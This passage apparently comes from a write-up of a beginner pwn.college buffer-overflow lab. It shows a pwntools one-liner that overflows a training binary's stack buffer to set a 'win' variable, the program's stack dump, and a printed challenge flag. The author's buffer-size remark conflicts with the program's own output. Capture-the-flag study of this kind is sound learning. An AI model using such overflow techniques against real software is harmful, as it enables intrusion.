...
In this snippet, `b'A'*60` overflows the buffer which is of 58 bytes + 2 padding bytes.

I got the flag with this.
```
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ python3 -c "from pwn import *; r = process('./binary-exploitation-first-overflow-w'); r.send(b'A'*60); print(r.readall())"
[+] Starting local process './binary-exploitation-first-overflow-w': pid 317
[+] Receiving all data: Done (4.85KB)
[*] Process './binary-exploitation-first-overflow-w' stopped with exit code -6 (SIGABRT) (pid 317)
b'The challenge() function has just been launched!\nBefore we do anything, let\'s take a look at challenge()\'s stack frame:\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffc5f7eb790 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb798 (rsp+0x0008) | 28 c9 7e 5f fc 7f 00 00 | 0x00007ffc5f7ec928 |\n| 0x00007ffc5f7eb7a0 (rsp+0x0010) | 18 c9 7e 5f fc 7f 00 00 | 0x00007ffc5f7ec918 |\n| 0x00007ffc5f7eb7a8 (rsp+0x0018) | 3d 75 18 3e 01 00 00 00 | 0x000000013e18753d |\n| 0x00007ffc5f7eb7b0 (rsp+0x0020) | a0 66 2e 3e 47 77 00 00 | 0x000077473e2e66a0 |\n| 0x00007ffc5f7eb7b8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb7c0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb7c8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb7d0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb7d8 (rsp+0x0048) | 00 17 1c 4b da 0c 27 b5 | 0xb5270cda4b1c1700 |\n| 0x00007ffc5f7eb7e0 (rsp+0x0050) | 20 c8 7e 5f fc 7f 00 00 | 0x00007ffc5f7ec820 |\n| 0x00007ffc5f7eb7e8 (rsp+0x0058) | 35 28 40 00 00 00 00 00 | 0x0000000000402835 |\n+---------------------------------+-------------------------+--------------------+\nOur stack pointer points to 0x7ffc5f7eb790, and our base pointer points to 0x7ffc5f7eb7e0.\nThis means that we have (decimal) 12 8-byte words in our stack frame,\nincluding the saved base pointer and the saved return address, for a\ntotal of 96 bytes.\nThe input buffer begins at 0x7ffc5f7eb7c0, partway through the stack frame,\n("above" it in the stack are other local variables used by the function).\nYour input will be read into this buffer.\nThe buffer is 20 bytes long, but the program will let you provide an arbitrarily\nlarge input length, and thus overflow the buffer.\n\nIn this level, there is a "win" variable.\nBy default, the value of this variable is zero.\nHowever, when this variable is non-zero, the flag will be printed.\nYou can make this variable be non-zero by overflowing the input buffer.\nThe "win" variable is stored at 0x7ffc5f7eb7d4, 20 bytes after the start of your input buffer.\n\nWe have disabled the following standard memory corruption mitigations for this challenge:\n- the binary is *not* position independent. This means that it will be\nlocated at the same spot every time it is run, which means that by\nanalyzing the binary (using objdump or reading this output), you can\nknow the exact value that you need to overwrite the return address with.\n\nYou have chosen to send 4096 bytes of input!\nThis will allow you to write from 0x7ffc5f7eb7c0 (the start of the input buffer)\nright up to (but not including) 0x7ffc5f7ec7c0 (which is 4076 bytes beyond the end of the buffer).\nSend your payload (up to 4096 bytes)!\nYou sent 60 bytes!\nLet\'s see what happened with the stack:\n\n+---------------------------------+-------------------------+--------------------+\n|                  Stack location |            Data (bytes) |      Data (LE int) |\n+---------------------------------+-------------------------+--------------------+\n| 0x00007ffc5f7eb790 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |\n| 0x00007ffc5f7eb798 (rsp+0x0008) | 28 c9 7e 5f fc 7f 00 00 | 0x00007ffc5f7ec928 |\n| 0x00007ffc5f7eb7a0 (rsp+0x0010) | 18 c9 7e 5f fc 7f 00 00 | 0x00007ffc5f7ec918 |\n| 0x00007ffc5f7eb7a8 (rsp+0x0018) | 3d 75 18 3e 01 00 00 00 | 0x000000013e18753d |\n| 0x00007ffc5f7eb7b0 (rsp+0x0020) | a0 66 2e 3e 3c 00 00 00 | 0x0000003c3e2e66a0 |\n| 0x00007ffc5f7eb7b8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |\n| 0x00007ffc5f7eb7c0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffc5f7eb7c8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffc5f7eb7d0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffc5f7eb7d8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffc5f7eb7e0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n| 0x00007ffc5f7eb7e8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |\n+---------------------------------+-------------------------+--------------------+\nThe program\'s memory status:\n- the input buffer starts at 0x7ffc5f7eb7c0\n- the saved frame pointer (of main) is at 0x7ffc5f7eb7e0\n- the saved return address (previously to main) is at 0x7ffc5f7eb7e8\n- the saved return address is now pointing to 0x4141414141414141.\n- the canary is stored at 0x7ffc5f7eb7d8.\n- the canary value is now 0x4141414141414141.\n- the address of the win variable is 0x7ffc5f7eb7d4.\n- the value of the win variable is 0x41414141.\n\nYou win! Here is your flag:\npwn.college{gYHvkn8ypdNIpg7TiOwOu7AnYLc.dlDOywSO5EzNzEzW}\n\n\nGoodbye!\n*** stack smashing detected ***: terminated\n'
hacker@binary-exploitation~your-first-overflow-easy:/challenge$ 
```
